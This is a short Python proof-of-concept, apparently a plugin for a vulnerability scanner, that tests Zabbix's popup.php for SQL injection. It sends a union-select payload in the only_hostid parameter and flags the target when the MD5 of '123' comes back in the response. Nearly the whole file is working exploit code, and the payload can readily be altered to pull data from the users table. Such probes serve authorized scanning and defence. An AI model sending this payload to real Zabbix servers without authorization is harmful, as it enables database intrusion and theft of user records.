#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Zabbix Popup.php SQL Injection
Reference :  None
Author    :  NoName
"""

import  re

def assign(service, arg):
    if service == "zabbix":
        return True, arg
        
def audit(arg):
    payload = "/popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=-1))%20union%20select%201,group_concat(md5('123'))%20from%20users%23"
    code, head, res, errcode, _ = curl.curl(arg + payload)
    if code == 200:
        m = re.search("202cb962ac59075b964b07152d234b70",res)
        if m:
            security_hole('zabbix popup.php sql injection exists.')

if __name__ == '__main__':
    from dummy import *
    audit(assign('zabbix', 'http://www.example.com/')[1])